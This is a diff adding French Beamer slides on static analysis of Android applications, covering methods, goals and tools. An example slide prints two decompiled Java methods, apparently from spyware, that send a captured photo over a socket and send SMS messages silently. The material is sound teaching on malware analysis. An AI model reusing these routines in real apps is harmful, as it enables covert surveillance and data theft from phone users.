@@ -1,0 +1,90 @@
+\documentclass[aspectratio=1610,]{beamer}%, handout
+\input{header.tex}
+\setbeameroption{show notes on second screen=top}
+\begin{document}
+ 
+\section{L'analyse statique}
+\begin{frame}[t]
+  \slidetitle[]
+  \note{\ExecuteMetaData[005-anastat_notes.tex]{Definition}}
+  \note{\onslide+<4->{\ExecuteMetaData[005-anastat_notes.tex]{Methodes}}}
+  \note{\onslide+<7->{\ExecuteMetaData[005-anastat_notes.tex]{Objectifs}}}
+  \note{\onslide+<11->{\ExecuteMetaData[005-anastat_notes.tex]{Outils}}}
+  \begin{block}{Qu'est ce que l'analyse statique?}<2->
+  \onslide<3->{
+    Examen d'un programme permettant d'obtenir des informations par rapport à son
+    comportement sans l'éxecuter.
+  }
+  \end{block}
+  \vspace{-0.5cm}
+  \begin{columns}[t]
+    \begin{column}{0.48\textwidth}
+      \begin{block}{Méthode d'analyse}<4->
+        \begin{itemize}
+        \item<5-> Analyse du code source
+        \item<6-> Analyse par signature
+        \end{itemize}
+        \end{block}
+      \begin{block} {Outils:}<11->
+      \begin{itemize}
+      \item<12-> jadx
+      \item<13-> Android Studio
+      \item<14-> exodus-standalone
+      \end{itemize}
+      \end{block}
+    \end{column}
+  \begin{column}{0.48\textwidth}
+      \begin{block}{Objectifs:}<7->
+      \begin{itemize}
+        \item<8-> Permissions de l'application
+        \item<9-> Trackers inclus
+        \item<10-> Portions de codes utilisables pour l'analyse dynamique
+        \end{itemize}
+      \end{block}
+    \end{column}
+  \end{columns}
+  \end{frame}
+  
+  \begin{frame}[fragile]
+    \slidetitle[Exemple]
+    \note{\ExecuteMetaData[005-anastat_notes.tex]{Exemple}}
+    \pause
+    \begin{figure}
+      \vspace{-0.25cm}
+      \begin{minted}{java}
+        private void sendPhoto(byte[] data) {
+          try {
+            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            bitmap.compress(CompressFormat.JPEG, 20, bos);
+            JSONObject object = new JSONObject();
+            object.put("image", true);
+            object.put("buffer", bos.toByteArray());
+            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
+          } catch (JSONException e) {
+            e.printStackTrace();
+          }
+        }
+      \end{minted}
+      \vspace{-0.25cm}
+      \caption{Méthode permettant la prise et l'envoie d'une photo}
+    \end{figure}
+    \pause
+    \begin{figure}
+      \vspace{-0.6cm}
+      \begin{minted}{java}
+        public static boolean sendSMS(String phoneNo, String msg) {
+          try {
+            SmsManager.getDefault().sendTextMessage(phoneNo, null, msg, null, null);
+            return true;
+          } catch (Exception ex) {
+            ex.printStackTrace();
+            return false;
+          }
+        }
+    \end{minted}
+      \vspace{-0.25cm}
+      \caption{Méthode permettant l'envoie d'un SMS}
+    \end{figure}
+  \end{frame}
+\end{document}
